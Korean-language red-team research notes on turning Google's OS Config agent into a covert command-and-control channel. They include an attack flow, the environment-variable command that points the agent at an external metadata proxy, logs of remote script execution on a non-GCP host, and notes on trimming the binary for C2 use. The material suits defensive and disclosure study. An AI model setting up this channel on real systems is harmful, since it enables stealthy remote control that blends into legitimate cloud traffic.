# GCP C2 Abuse Research

EvilSSM 패턴의 GCP 버전 가능성 조사. AWS SSM Agent처럼 GCP의 오픈소스 에이전트를 수정하여 GCP 인프라 자체를 C2로 사용할 수 있는지 분석.

## TL;DR

**OS Config Agent (`google-osconfig-agent`)가 SSM Agent의 GCP 버전에 해당한다.** Go 오픈소스, gRPC로 `osconfig.googleapis.com`에 연결, `RegisterAgent` → `ReceiveTaskNotification` 스트리밍으로 태스크 수신, ExecResource를 통해 임의 스크립트 실행 가능. 메타데이터 서버 에뮬레이터와 조합하면 GCE 외부에서도 동작 가능성 있음.

---

## 1. EvilSSM 패턴 요약 (비교 기준)

| 요소 | EvilSSM (AWS SSM Agent) |
|---|---|
| 소스 | [github.com/aws/amazon-ssm-agent](https://github.com/aws/amazon-ssm-agent) (Go, Apache 2.0) |
| 등록 | Hybrid Activation (activation code/ID) → `RegisterManagedInstance` API |
| 통신 | HTTPS polling (MDS) + WebSocket (MGS) → `ssmmessages.<region>.amazonaws.com` |
| 명령 실행 | RunCommand (임의 셸 스크립트), Session (인터랙티브 셸) |
| 인증 | STS 임시 자격증명 (activation에서 파생) |
| C2 서버 | 없음 — AWS 인프라 자체가 C2 |
| 트래픽 | 전부 `*.amazonaws.com:443` (정상 트래픽과 구분 불가) |

---

## 2. GCP 에이전트 후보 분석

### 2.1 OS Config Agent (google-osconfig-agent) — 주요 타겟

| 항목 | 상세 |
|---|---|
| GitHub | [GoogleCloudPlatform/osconfig](https://github.com/GoogleCloudPlatform/osconfig) |
| 언어 | Go (97.8%) |
| 라이선스 | Apache 2.0 |
| 역할 | VM Manager의 핵심 에이전트. OS 인벤토리, 패치 관리, OS 정책 적용 |
| 통신 프로토콜 | gRPC over TLS → `osconfig.googleapis.com` |
| 인증 | GCE 메타데이터 서버에서 instance identity token 획득 (`/computeMetadata/v1/instance/service-accounts/default/identity?audience=osconfig.googleapis.com&format=full`) |

#### gRPC API (agentendpoint/v1)

| 메서드 | 용도 |
|---|---|
| `RegisterAgent` | 에이전트 등록 (VM 인스턴스를 OS Config 서비스에 등록) |
| `ReceiveTaskNotification` | **스트리밍** — 태스크 할당 대기 (SSM의 MGS WebSocket에 해당) |
| `StartNextTask` | 태스크 실행 시작 신호 + 태스크 정보 수신 |
| `ReportTaskProgress` | 중간 진행 상태 보고 |
| `ReportTaskComplete` | 태스크 완료 보고 + 다음 태스크 수신 |
| `ReportInventory` | VM 인벤토리 보고 |

#### 명령 실행 기능

1. **OS Policy — ExecResource**: 임의 셸(`/bin/sh`) 또는 PowerShell 스크립트 실행. validate (exit 100=OK, 101=enforce 필요) → enforce 2단계 패턴
2. **Patch Job — Pre/Post Step**: 패치 작업 전후 스크립트 실행 (`linuxExecStepConfig`, `windowsExecStepConfig`). 로컬 경로 또는 GCS 객체 참조
3. **Software Recipes**: 소프트웨어 설치/설정 레시피 실행

#### 왜 C2로 유망한가

- `ReceiveTaskNotification` = 상시 대기하는 스트리밍 gRPC 채널 → C2 명령 수신에 적합
- ExecResource = 임의 스크립트 실행 → 사실상 RunCommand와 동일
- 모든 트래픽이 `osconfig.googleapis.com:443` (TLS) → 정상 GCP 트래픽과 구분 불가
- 오픈소스 Go 코드 → EvilSSM과 동일한 수정 전략 적용 가능

#### 핵심 과제: GCE 외부 인증

OS Config Agent는 GCE 메타데이터 서버(`169.254.169.254`)에서 identity token을 가져옴. GCE 외부에서 실행하려면:

**방법: 메타데이터 서버 에뮬레이터 사용**
- [salrashid123/gce_metadata_server](https://github.com/salrashid123/gce_metadata_server) — GCE 메타데이터 서버 에뮬레이터
- 서비스 계정 키 파일을 사용하여 **Google이 서명한 유효한 identity token** 생성 가능
- `GCE_METADATA_HOST` 환경변수로 에뮬레이터 주소 설정, 또는 iptables로 `169.254.169.254` → localhost 리다이렉트
- 프로젝트 ID, 존, 인스턴스 이름 등 메타데이터 값도 제공
- `config.json`에 서비스 계정 이메일 설정 필요

**이론적 공격 흐름:**
1. 공격자의 GCP 프로젝트에서 서비스 계정 생성 + 키 발급
2. 메타데이터 에뮬레이터 구동 (서비스 계정 키로 identity token 생성)
3. 수정된 OS Config Agent 실행 → 에뮬레이터에서 token 획득 → `osconfig.googleapis.com`에 `RegisterAgent`
4. 공격자가 GCP Console/API에서 OS Policy (ExecResource) 배포 → 에이전트가 임의 스크립트 실행
5. 모든 트래픽은 `*.googleapis.com:443`

---

### 2.2 Guest Agent (google-guest-agent) — 보조 타겟

| 항목 | 상세 |
|---|---|
| GitHub | [GoogleCloudPlatform/guest-agent](https://github.com/GoogleCloudPlatform/guest-agent) |
| 언어 | Go (96%) |
| 역할 | GCE VM 기본 관리 (계정, SSH 키, 네트워크, 메타데이터 스크립트) |
| 통신 | 메타데이터 서버 HTTP 폴링 + gRPC 플러그인 시스템 |
| 아키텍처 | guest-agent-manager (중앙 관리) + core plugin + extensions (v20250901.00+) |

#### 명령 실행 기능
- **메타데이터 스크립트**: startup/shutdown 스크립트 실행 (인라인 또는 URL 기반)
- **계정 관리**: SSH 키 프로비저닝, OS Login 설정

#### C2 한계
- 메타데이터 서버 **폴링** 방식 → 상시 명령 채널 없음 (OS Config의 gRPC 스트리밍과 다름)
- 스크립트 실행이 부팅/종료 시점에만 발생
- VM Extension Manager를 통한 플러그인 관리가 있지만, 커맨드 채널보다는 설정 배포에 가까움

#### 그럼에도 흥미로운 점
- 플러그인 아키텍처 → 악의적 플러그인을 extension으로 등록 가능성
- MTLS 인증서 자동 관리 → 인증 인프라 활용 가능

---

### 2.3 GKE Connect Agent — 흥미로운 대안

| 항목 | 상세 |
|---|---|
| 소스 | 비공개 (오픈소스 아님) |
| 역할 | GKE 외부 클러스터를 GCP Fleet에 등록, Connect Gateway를 통한 원격 kubectl 접근 |
| 통신 | **아웃바운드 전용** 터널 → GCP (인바운드 방화벽 규칙 불필요) |
| 명령 실행 | kubectl 명령을 GCP → 에이전트 → 클러스터 API 서버로 전달 |

- 에이전트가 먼저 GCP에 연결 (아웃바운드) → 방화벽 우회
- 모든 K8s 클러스터에 설치 가능 (EKS, AKS, on-prem 포함)
- **오픈소스가 아니므로 EvilSSM 패턴 적용 불가**, 하지만 정상 등록 후 악용은 가능

---

### 2.4 기타 에이전트 (C2 부적합)

| 에이전트 | GitHub | 부적합 이유 |
|---|---|---|
| Ops Agent | [GoogleCloudPlatform/ops-agent](https://github.com/GoogleCloudPlatform/ops-agent) | 모니터링/로깅 전용, 명령 실행 없음 |
| Cloud Build | Builder 이미지만 오픈소스 | 독립 에이전트 없음, 컨테이너 기반 |
| Cloud Deploy | — | 독립 에이전트 없음 |
| Developer Connect | — | Git 연동 서비스, 에이전트 없음 |

---

## 3. EvilSSM vs EvilOSConfig 비교

| 요소 | EvilSSM (AWS) | EvilOSConfig (GCP, 이론적) |
|---|---|---|
| 소스 에이전트 | amazon-ssm-agent | google-osconfig-agent |
| 언어 | Go | Go |
| 등록 메커니즘 | Hybrid Activation (code/ID) | 메타데이터 에뮬레이터 + 서비스 계정 키 |
| 명령 채널 | MGS WebSocket 스트리밍 | `ReceiveTaskNotification` gRPC 스트리밍 |
| 명령 실행 | RunCommand (셸 스크립트) | ExecResource (셸/PowerShell 스크립트) |
| 인터랙티브 셸 | SSM Session (Port Forward 포함) | 없음 (OS Config에는 세션 개념 없음) |
| C2 트래픽 | `ssmmessages.<region>.amazonaws.com:443` | `osconfig.googleapis.com:443` |
| 난이도 | 낮음 (Hybrid Activation이 설계된 기능) | **높음** (메타데이터 에뮬레이터 필요, identity token 검증 우회 필요) |

### GCP가 더 어려운 이유

1. **SSM의 Hybrid Activation 같은 기능이 없음** — AWS는 EC2 외부 머신 등록을 공식 지원하지만, GCP OS Config는 GCE VM 전용으로 설계됨
2. **Identity token 검증** — `RegisterAgent` 시 Google이 서명한 identity token이 필요. 에뮬레이터가 생성하는 토큰이 실제 GCE 인스턴스가 아닌 서비스 계정 기반이므로, 서버 측에서 instance claim 검증 시 거부될 수 있음
3. **인터랙티브 셸 없음** — OS Config는 스크립트 실행만 지원, SSM Session 같은 대화형 셸은 없음

### 그럼에도 가능성이 있는 이유

1. **Identity token은 서비스 계정으로도 생성 가능** — 에뮬레이터가 Google 서명 토큰을 생성
2. **오픈소스 코드 수정 가능** — 인증 로직 자체를 수정하여 직접 서비스 계정 키로 인증
3. **ExecResource만으로 충분** — 인터랙티브 셸 없이도 스크립트 기반 C2는 가능
4. **gRPC 스트리밍이 존재** — 상시 연결 채널 확보 가능

---

## 4. 소스코드 분석 — 인증 메커니즘 상세

### Identity Token 획득 흐름

`agentconfig/agentconfig.go` 분석 결과:

```
에이전트 시작
  → WatchConfig() — 메타데이터 서버에서 프로젝트/존/인스턴스 정보 획득
  → IDToken() — 메타데이터에서 identity token 획득
  → RegisterAgent() — gRPC로 토큰과 함께 등록
  → ReceiveTaskNotification() — 스트리밍 대기
```

**핵심 발견: `GCE_METADATA_HOST` 환경변수**

`agentconfig.go:46` — 메타데이터 호스트를 환경변수로 오버라이드 가능:
```go
metadataHostEnv = "GCE_METADATA_HOST"
```

`agentconfig.go:441-450` — 모든 메타데이터 요청이 이 값을 사용:
```go
host := os.Getenv(metadataHostEnv)
if host == "" { host = "169.254.169.254" }
url := "http://" + host + "/computeMetadata/v1/" + suffix
```

`IDToken()`도 동일한 `cloud.google.com/go/compute/metadata` 패키지 사용 → `GCE_METADATA_HOST` 존중.

### Identity Token 구조 — 왜 에뮬레이터로는 안 되는가

GCE 인스턴스 identity token (`format=full`) JWT payload:
```json
{
  "iss": "https://accounts.google.com",
  "aud": "osconfig.googleapis.com",
  "google": {
    "compute_engine": {
      "project_id": "my-project",
      "project_number": 739419398126,
      "zone": "us-west1-a",
      "instance_id": "152986662232938449",
      "instance_name": "my-instance"
    }
  }
}
```

`google.compute_engine` 블록은 **실제 GCE 메타데이터 서버만** 생성 가능. 서비스 계정 키로 생성한 ID 토큰에는 이 claim이 없음. Google의 RSA 서명이므로 위조 불가.

### PoC 아키텍처 — 메타데이터 프록시 방식

```
대상 머신                              GCE e2-micro
┌──────────────┐                     ┌────────────────────┐
│ PoC 에이전트  │──HTTP──────────────▶│ metadata-proxy.py  │
│ (hardcoded   │  metadataProxyHost  │ :8080 → 169.254.   │
│  proxy addr) │                     │ 169.254 (real MDS)  │
└──────┬───────┘                     └────────────────────┘
       │ gRPC/TLS
       │ InstanceIdToken (real google.compute_engine claims)
       ▼
 osconfig.googleapis.com
```

**PoC 파일:**
- `poc/metadata-proxy.py` — GCE에서 실행할 메타데이터 프록시 (Python, 40줄)
- `poc/main.go` — 대상에서 실행할 PoC 클라이언트 (프록시로 토큰 획득 → RegisterAgent 호출)

### PoC 결과 — RegisterAgent 성공 (2026-06-07 확인)

**메타데이터 프록시를 통한 토큰 획득 + RegisterAgent 호출 성공.**

```
[+] Project: ivory-plane-450611-c7
[+] Zone:    projects/613015254457/zones/us-central1-a
[+] Name:    osconfig-token-proxy

[+] Got token (1089 bytes)
[+] Token issuer:   https://accounts.google.com
[+] Token audience: osconfig.googleapis.com
[+] google.compute_engine claims:
    { "compute_engine": {
        "instance_id": "4051253412791635859",
        "instance_name": "osconfig-token-proxy",
        "project_id": "ivory-plane-450611-c7",
        "project_number": 613015254457,
        "zone": "us-central1-a"
    }}

[*] Calling RegisterAgent...
[+] RegisterAgent SUCCEEDED!
[*] Waiting for task notifications (Ctrl+C to stop)...
```

**확인된 사항:**
- GCE 외부에서 메타데이터 프록시를 통해 유효한 identity token 획득 가능
- `google.compute_engine` claim이 포함된 real token으로 RegisterAgent 통과
- ReceiveTaskNotification 스트림 연결 성공
- **GCE 인스턴스에 SSH 불필요** — HTTP 프록시만 있으면 됨

### PoC 결과 2 — OS Policy ExecResource 명령 실행 성공 (2026-06-07 확인)

**GCP에서 OS Policy를 배포하여 Kali 머신(GCE 외부)에서 임의 명령 실행 성공.**

```
[+] TASK NOTIFICATION RECEIVED!
[+] Task received: type=APPLY_CONFIG_TASK id=0fb727fa-740e-4242-8b79-54089012007b
[+] APPLY_CONFIG_TASK received (OS Policy)
[+] OS Policy: evil-exec-test (mode=ENFORCEMENT)
[+]   Resource: run-command
[+]   Has Exec resource!
[+]     Running validate script...
[+]     Output: uid=1000(kali) gid=1000(kali) groups=1000(kali),...
             rt-local          ← Kali 호스트네임 (GCE가 아님!)
             kali
             EVILOSCONFIG_POC_SUCCESS

[+]     Running enforce script...
[+]     Output: enforce step running on rt-local as kali
[+] Config task reported complete
```

**완전한 C2 사이클 확인:**
1. 공격자가 GCP Console/API에서 OS Policy 배포 (`gcloud compute os-config os-policy-assignments create`)
2. `osconfig.googleapis.com`가 ReceiveTaskNotification 스트림으로 태스크 전송
3. Kali의 PoC 에이전트가 태스크 수신 → ExecResource 스크립트 실행
4. 실행 결과를 `osconfig.googleapis.com`에 보고
5. **모든 트래픽은 `*.googleapis.com:443` (TLS)** — 정상 GCP 트래픽과 구분 불가

### PoC 결과 3 — 소스코드 수정 없이 공식 에이전트 실행 성공 (2026-06-07 확인)

**코드 변경 0줄. 환경변수 하나로 동작.**

```bash
GCE_METADATA_HOST=34.66.245.141:8080 ./google_osconfig_agent -stdout -debug
```

```
OSConfigAgent Info: OSConfig Agent started.
RegisterAgent request: {
  "os_long_name": "Kali GNU/Linux Rolling",
  "os_short_name": "kali",
  "os_version": "2025.3",
  "os_architecture": "x86_64"
}
RegisterAgent response: {} (성공)
ReceiveTaskNotification → Received task notification.
APPLY_CONFIG_TASK → APPLYING_CONFIG
  VALIDATION: SUCCEEDED
  DESIRED_STATE_CHECK: SUCCEEDED
  DESIRED_STATE_ENFORCEMENT: stdout: "enforce step running on rt-local as kali"
ReportTaskComplete → {} (성공)
Successfully completed ApplyConfigTask
```

**핵심:** GCE_METADATA_HOST 환경변수가 이미 에이전트에 내장되어 있으므로, 소스코드를 한 줄도 수정하지 않고 공식 빌드 그대로 외부에서 실행 가능. EvilSSM보다 훨씬 간단.

**EvilSSM과의 결정적 차이:**
- EvilSSM: 수백 줄의 코드 수정 필요 (single binary, 권한 제거, 경로 변경, 등록 하드코딩)
- EvilOSConfig: **코드 수정 0줄** — `GCE_METADATA_HOST` 환경변수 + 메타데이터 프록시만으로 동작

---

## 5. 바이너리 크기 분석

| 상태 | 크기 |
|---|---|
| 빌드 그대로 (`CGO_ENABLED=0 go build`) | 88 MB |
| `-ldflags="-s -w"` (링커 레벨 디버그 제거) | 56 MB |
| `--trim` (scalibr 제거 + `-s -w`) | **34 MB** ← 권장 |

### 왜 이렇게 큰가

심볼 분석 (`go tool nm`) 결과, 불필요한 의존성이 대부분:

| 패키지 | 용도 | 필요 여부 |
|---|---|---|
| `modernc.org/sqlite` | scalibr 인벤토리 스캐너의 의존성 | 불필요 |
| `envoyproxy/go-control-plane` | gRPC xDS (로드밸런싱) | 불필요 |
| `google/osv-scalibr` | 취약점 스캐너 | 불필요 |
| `cloud.google.com/go/monitoring` | Cloud Monitoring 텔레메트리 | 불필요 |
| `go.opentelemetry.io` | OpenTelemetry 메트릭 | 불필요 |
| `cloud.google.com/go/logging` | Cloud Logging | 불필요 |

C2 목적에 필요한 것은 `agentendpoint` (gRPC 클라이언트), `config` (ExecResource 실행), `ospatch` (패치 작업) 정도. EvilSSM 방식으로 불필요한 모듈을 제거하면 25-30MB까지 줄일 수 있음.

### 축소 방법 — `evilosconfig-controller.py compile --trim`

`--trim` 옵션이 자동으로 처리:
1. `packages/scalibr.go`를 빈 stub으로 교체 (빌드 시만, 원본 복구됨)
2. `go.mod`에서 `osv-scalibr`, `cos/tools` 제거
3. `go mod tidy` → 불필요한 의존성 체인 전체 제거
4. `-ldflags="-s -w"`로 디버그 심볼 제거 (strip/UPX 불필요)

결과: 88MB → **34MB** (소스 수정 없이, 빌드 시 자동 stub + 복구)

## 6. 추가 연구 방향

1. **메타데이터 프록시 토큰으로 `RegisterAgent` 가능한지 실제 테스트** ← 현재 진행 중
2. **OS Config Agent 코드에서 인증 부분을 서비스 계정 키 직접 사용으로 수정**
3. **Guest Agent의 ACS (Agent Communication Service) 채널 분석** — 플러그인 시스템을 통한 명령 실행 가능성
4. **GKE Connect Agent 역공학** — 오픈소스는 아니지만 바이너리 분석 가능
5. 공인 IP를 google-redirector 로 바꿔 target -> redirector -> GCE -> osconfig backend로 갈 수 있도록 변경           
https://github.com/praetorian-inc/google-redirector

---

## 레퍼런스

1. [GoogleCloudPlatform/osconfig](https://github.com/GoogleCloudPlatform/osconfig) — OS Config Agent 소스코드
2. [GoogleCloudPlatform/guest-agent](https://github.com/GoogleCloudPlatform/guest-agent) — Guest Agent 소스코드
3. [GoogleCloudPlatform/ops-agent](https://github.com/GoogleCloudPlatform/ops-agent) — Ops Agent 소스코드
4. [salrashid123/gce_metadata_server](https://github.com/salrashid123/gce_metadata_server) — GCE 메타데이터 서버 에뮬레이터
5. [OS Config agentendpoint API v1](https://docs.cloud.google.com/go/docs/reference/cloud.google.com/go/osconfig/latest/agentendpoint/apiv1) — gRPC API 문서
6. [About the Guest Agent](https://docs.cloud.google.com/compute/docs/images/guest-agent) — Guest Agent 아키텍처 문서
7. [Guest Agent Functionality](https://docs.cloud.google.com/compute/docs/images/guest-agent-functions) — Guest Agent 기능 상세
8. [Connect Agent Overview](https://cloud.google.com/kubernetes-engine/fleet-management/docs/connect-agent) — GKE Connect Agent 문서
9. [OS Policy and ExecResource](https://docs.cloud.google.com/compute/vm-manager/docs/os-policies/working-with-os-policies) — ExecResource 스크립트 실행 문서
10. [Create Patch Jobs](https://docs.cloud.google.com/compute/vm-manager/docs/patch/create-patch-job) — 패치 작업 Pre/Post 스크립트
11. [Cloud Build Overview](https://docs.cloud.google.com/build/docs/overview?hl=ko) — Cloud Build 개요
12. [Developer Connect Overview](https://docs.cloud.google.com/developer-connect/docs/overview?hl=ko) — Developer Connect 개요
13. [Cloud Deploy Overview](https://docs.cloud.google.com/deploy/docs/overview?hl=ko) — Cloud Deploy 개요
14. [GCP Products](https://cloud.google.com/products?hl=ko) — 전체 GCP 서비스 목록
15. [Persistent GCP Backdoors with Cloud Shell](https://89berner.medium.com/persistant-gcp-backdoors-with-googles-cloud-shell-2f75c83096ec) — Cloud Shell 악용 사례
16. [GCP Cloud Shell Abuse (SlideShare)](https://www.slideshare.net/slideshow/one-port-to-serve-them-all-google-gcp-cloud-shell-abuse/272893190) — Cloud Shell 악용 발표자료
17. [AWS SSM C2 with Sliver](https://rodelllemit.medium.com/aws-pentesting-reverse-shell-using-sliver-c2-through-ssm-87d417bd21c1) — SSM C2 악용 사례 (비교용)
18. [Google Cloud Security Bulletin - OS Config Privesc](https://www.securityweek.com/google-patches-privilege-escalation-vulnerability-cloud-service/) — OS Config 권한 상승 취약점
19. [GKE Metadata Server Emulator for non-GKE](https://github.com/matheuscscp/gke-metadata-server) — 비-GKE 클러스터용 메타데이터 에뮬레이터
20. [Set up VM Manager](https://docs.cloud.google.com/compute/vm-manager/docs/setup) — VM Manager 설정 문서
